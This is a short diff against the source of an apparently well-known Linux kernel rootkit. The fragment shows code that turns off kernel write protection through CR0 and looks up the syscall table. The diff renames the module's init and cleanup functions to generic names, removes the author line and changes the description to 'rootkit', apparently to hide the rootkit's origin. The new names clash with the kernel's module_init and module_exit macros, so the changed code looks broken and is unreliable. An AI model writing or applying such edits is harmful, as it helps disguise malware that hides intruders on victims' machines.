@@ -250,7 +250,7 @@ static inline void unprotect_memory(void)
 	write_cr0_forced(cr0 & ~0x00010000);
 }
 
-static int __init diamorphine_init(void)
+static int __init module_init(void)
 {
 	__sys_call_table = get_syscall_table_bf();
 	if (!__sys_call_table)
@@ -275,7 +275,7 @@ static int __init diamorphine_init(void)
 }
 
 static void __exit
-diamorphine_cleanup(void)
+module_exit(void)
 {
 	unprotect_memory();
 
@@ -286,9 +286,8 @@ diamorphine_cleanup(void)
 	protect_memory();
 }
 
-module_init(diamorphine_init);
-module_exit(diamorphine_cleanup);
+module_init(module_init);
+module_exit(module_exit);
 
 MODULE_LICENSE("Dual BSD/GPL");
-MODULE_AUTHOR("m0nad");
-MODULE_DESCRIPTION("LKM rootkit");
+MODULE_DESCRIPTION("rootkit");
